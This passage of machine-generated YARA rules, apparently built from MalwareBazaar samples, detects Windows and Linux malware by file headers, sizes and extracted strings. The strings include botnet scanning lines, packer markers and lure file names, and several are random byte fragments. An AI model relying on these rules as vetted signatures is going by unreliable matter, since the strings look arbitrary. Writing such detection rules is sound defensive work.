        description = "Auto ML: 1181cfd2b34e7be8a43ea7335ae541ee72c2fb50ab86c1ca0155864965766a55"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".reloc"
        $s3 = "v4.0.30319"
        $s4 = "SilverClient.exe"
        $s5 = "System.Collections"
        $s6 = ".ctor"
        $s7 = "System.Security.Cryptography.X509Certificates"
        $s8 = "System.IO"
        $s9 = "System.Text"
        $s10 = "System.Threading"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 38KB
        and all of them
}

rule Linux_a5aaa929d94c5742bcaf131ece5655978a46646d9ffbd071a64ba8326448f8bb{
    meta:
        description = "Auto ML: a5aaa929d94c5742bcaf131ece5655978a46646d9ffbd071a64ba8326448f8bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "YXSh0/"
        $s2 = "XZhx/"
        $s3 = "u\\PPSV"
        $s4 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s5 = "M-SEARCH * HTTP/1.1"
        $s6 = "HOST: 255.255.255.255:1900"
        $s7 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s8 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s9 = "GET /"
        $s10 = "HEAD /"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 109KB
        and all of them
}

rule Windows_a5b919aba0810bad117beb62275a94d13a0a0c2961cdf5e3e3202c08b07ea19a{
    meta:
        description = "Auto ML: a5b919aba0810bad117beb62275a94d13a0a0c2961cdf5e3e3202c08b07ea19a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "K2..4"
        $s3 = "3rZ8\\"
        $s4 = "CNQ.-"
        $s5 = "B6.Sy"
        $s6 = "XH/mN"
        $s7 = "/.Go5"
        $s8 = ".AS7s"
        $s9 = "M/6iY"
        $s10 = "Ip/z9"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6068KB
        and all of them
}

rule Windows_a5c3953bc98a6e0d255ef2349c578fe7d9c3acb9484c5d2c9c34673d1392c431{
    meta:
        description = "Auto ML: a5c3953bc98a6e0d255ef2349c578fe7d9c3acb9484c5d2c9c34673d1392c431"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".ndata"
        $s3 = ".rsrc"
        $s4 = "tZj\\V"
        $s5 = "\\u f9O"
        $s6 = "ADVAPI32.dll"
        $s7 = "SHELL32.dll"
        $s8 = "ole32.dll"
        $s9 = "COMCTL32.dll"
        $s10 = "USER32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2410KB
        and all of them
}

rule Windows_a5e0ccb21c5eba05f7ede4fcb26987e87e34ea05e1b71206882a847cf3e5e7bd{
    meta:
        description = "Auto ML: a5e0ccb21c5eba05f7ede4fcb26987e87e34ea05e1b71206882a847cf3e5e7bd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "fZc/1"
        $s4 = "b3/dr"
        $s5 = "SX8/P"
        $s6 = "Qpl\\k"
        $s7 = "aS\\IvSu"
        $s8 = "oH\\h:T"
        $s9 = "8Iwa/"
        $s10 = "GL/lR"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 313KB
        and all of them
}

rule Linux_a60a88ba2b5562988d8a1ce4f949d4ff73ab8161af5688421ed59d753309a8ba{
    meta:
        description = "Auto ML: a60a88ba2b5562988d8a1ce4f949d4ff73ab8161af5688421ed59d753309a8ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "n9Xo\\N3"
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 38KB
        and all of them
}

rule Windows_a61589bc1fbf8a004af8b09f9140597f8f3fc40e7ede6c52bd77c8447d34f23a{
    meta:
        description = "Auto ML: a61589bc1fbf8a004af8b09f9140597f8f3fc40e7ede6c52bd77c8447d34f23a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "Yef \\on"
        $s3 = "aefe / g"
        $s4 = "v4.0.30319"
        $s5 = "paymentslip.exe"
        $s6 = "System.Collections.Generic"
        $s7 = "System.Net"
        $s8 = "System.Collections"
        $s9 = "System.Security.Cryptography"
        $s10 = "System.IO"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 845KB
        and all of them
}

rule Linux_a621dc87040c7173a7dc5c18d7accfc25aca6ec0325583d09e393adb375ccb9f{
    meta:
        description = "Auto ML: a621dc87040c7173a7dc5c18d7accfc25aca6ec0325583d09e393adb375ccb9f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s5 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s6 = "GET /"
        $s7 = "HEAD /"
        $s8 = "POST /"
        $s9 = "HTTP/1.1 404 Not Found"
        $s10 = "HTTP/1.1 200 OK"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 161KB
        and all of them
}

rule Windows_a64124c02d6acf685b9103424aec264f00b73ef600cae68ba595df49f9072544{
    meta:
        description = "Auto ML: a64124c02d6acf685b9103424aec264f00b73ef600cae68ba595df49f9072544"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "MSVBVM60.DLL"
        $s4 = "IRR / NPV / Value Chain"
        $s5 = "RichTextLib.RichTextBox"
        $s6 = "This sets the size as the default. Use it to create shapes of the same size."
        $s7 = "MSComDlg.CommonDialog"
        $s8 = "XXX123.CoolerBar"
        $s9 = "MSScriptControlCtl.ScriptControl"
        $s10 = "XXX123.FlowShape"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Linux_a669c566ce3a37ff309f341c95dffc017f2b77df2815b34ba1ec0f700dc7b0e7{
    meta:
        description = "Auto ML: a669c566ce3a37ff309f341c95dffc017f2b77df2815b34ba1ec0f700dc7b0e7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "4M.046"
        $s2 = "tW0//l"
        $s3 = "RrK._"
        $s4 = "lK80F/"
        $s5 = "pA/cW"
        $s6 = "L0/Z/"
        $s7 = "c/stat"
        $s8 = "sys/devis"
        $s9 = "/proc/self/exe"
        $s10 = "/proc"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Windows_a6de6e835a5908e907e01fbf14cb2f59644d11b574943b7e8ce3b0a703a0c025{
    meta:
        description = "Auto ML: a6de6e835a5908e907e01fbf14cb2f59644d11b574943b7e8ce3b0a703a0c025"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
        $s3 = ".idata"
        $s4 = ".fldo"
        $s5 = "D\\JVV"
        $s6 = "WA\\JRS"
        $s7 = "A\\JjL"
        $s8 = "ole32.DLL"
        $s9 = "OLEAUT32.DLL"
        $s10 = "WININET.DLL"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 338KB
        and all of them
}

rule Linux_11cd0baa606e368f97d45a1967b485b81791bdf4bb88fd143b14cb212d82b3a5{
    meta:
        description = "Auto ML: 11cd0baa606e368f97d45a1967b485b81791bdf4bb88fd143b14cb212d82b3a5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s5 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s6 = "GET /"
        $s7 = "HEAD /"
        $s8 = "POST /"
        $s9 = "HTTP/1.1 404 Not Found"
        $s10 = "HTTP/1.1 200 OK"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 162KB
        and all of them
}

rule Windows_a75d18534ff8dae63ffb7b62517b7b687342fa2ccfdc29e79a2fc20c62db33fa{
    meta:
        description = "Auto ML: a75d18534ff8dae63ffb7b62517b7b687342fa2ccfdc29e79a2fc20c62db33fa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "vYf \\"
        $s3 = "LLz/ef"
        $s4 = "v4.0.30319"
        $s5 = "System.Reflection"
        $s6 = ".ctor"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "System.Diagnostics"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 359KB
        and all of them
}

rule Linux_a78c585914214e3c71123e41b7c9c220065cddd3b9aefbe909ebe9dc40e29ff0{
    meta:
        description = "Auto ML: a78c585914214e3c71123e41b7c9c220065cddd3b9aefbe909ebe9dc40e29ff0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/ :Gt"
        $s2 = "aw.\\D"
        $s3 = ".:-5yT"
        $s4 = "98.g/U"
        $s5 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s6 = "wfb_.i/"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 26KB
        and all of them
}

rule Linux_a7bed39c0de17ecacc04d8b7eb70fea404ddb3f1ca0957904fb10d3dd3b2f870{
    meta:
        description = "Auto ML: a7bed39c0de17ecacc04d8b7eb70fea404ddb3f1ca0957904fb10d3dd3b2f870"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "nc42c."
        $s2 = "rPlG /r"
        $s3 = "/kELkr"
        $s4 = "ogzw."
        $s5 = "g.GR/"
        $s6 = ".EU 6n"
        $s7 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s8 = "w09A."

    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB
        and all of them
}

rule Windows_a7ffba3e41ce82350677836a511daec0e105d77cc722bafc77007235eab2f1d4{
    meta:
        description = "Auto ML: a7ffba3e41ce82350677836a511daec0e105d77cc722bafc77007235eab2f1d4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "i .pV"
        $s3 = "Y .ZH"
        $s4 = "Xea ."
        $s5 = "v/j y"
        $s6 = "v/j z"
        $s7 = "u/j xs"
        $s8 = "q \\w/s"
        $s9 = "u/j cs"
        $s10 = "u/j bs"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1000KB
        and all of them
}

rule Windows_a809b6ffd9241ec430d4ab5c866566365b642a9e553f811cbf5f3dc5acdd0ce5{
    meta:
        description = "Auto ML: a809b6ffd9241ec430d4ab5c866566365b642a9e553f811cbf5f3dc5acdd0ce5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "v4.0.30319"
        $s3 = "raf.exe"
        $s4 = "SmartAssembly.Delegates"
        $s5 = "SmartAssembly.HouseOfCards"
        $s6 = "System.IO"
        $s7 = "SmartAssembly.Attributes"
        $s8 = "System.Collections.Generic"
        $s9 = "System.Threading"
        $s10 = "System.Text"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3958KB
        and all of them
}

rule Windows_a8905ed9ed1f5b9d74cee3da53ebc0a21af8cbcbf86504ac52f4234cc54c60e1{
    meta:
        description = "Auto ML: a8905ed9ed1f5b9d74cee3da53ebc0a21af8cbcbf86504ac52f4234cc54c60e1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "a/pf5"
        $s4 = "gNhvl\\"
        $s5 = "RsY/U"
        $s6 = "B R2."
        $s7 = "rXhj."
        $s8 = "\\p_/G9"
        $s9 = "H9l//"
        $s10 = "l.\\Ze"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 241KB
        and all of them
}

rule Windows_a894df972f961b115a6567cc0769f235e211fd15ca89dbe2a03cee66507bfdbf{
    meta:
        description = "Auto ML: a894df972f961b115a6567cc0769f235e211fd15ca89dbe2a03cee66507bfdbf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "e\\vkH"
        $s4 = "Ctr\\v"
        $s5 = "/5zg6c"
        $s6 = "C8i/j"
        $s7 = "\\4dD."
        $s8 = "zS\\yX"
        $s9 = ".Fo0.sw"
        $s10 = "xTZ/S"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 257KB
        and all of them
}

rule Linux_a89a478321fbe617de49c92cd3b8f2adf889f73b0301f777156f2bade68bde11{
    meta:
        description = "Auto ML: a89a478321fbe617de49c92cd3b8f2adf889f73b0301f777156f2bade68bde11"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "_d2/a"
        $s2 = "\\MTL4D"
        $s3 = "/self/ex"
        $s4 = "/devi"
        $s5 = "/proc/self/exe"
        $s6 = "/proc"
        $s7 = "0\\MSA"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB
        and all of them
}

rule Windows_a8a3130c779904e23b50d69b4e73a714b345e296feebb9f64a732d5c73e7973b{
    meta:
        description = "Auto ML: a8a3130c779904e23b50d69b4e73a714b345e296feebb9f64a732d5c73e7973b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "An application has made an attempt to load the C runtime library incorrectly."
        $s4 = "- Attempt to initialize the CRT more than once."
        $s5 = "This indicates a bug in your application."
        $s6 = "- not enough space for _onexit/atexit table"
        $s7 = "This application has requested the Runtime to terminate it in an unusual way."
        $s8 = "MM/dd/yy"
        $s9 = "USER32.DLL"
        $s10 = "kernel32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 223KB
        and all of them
}

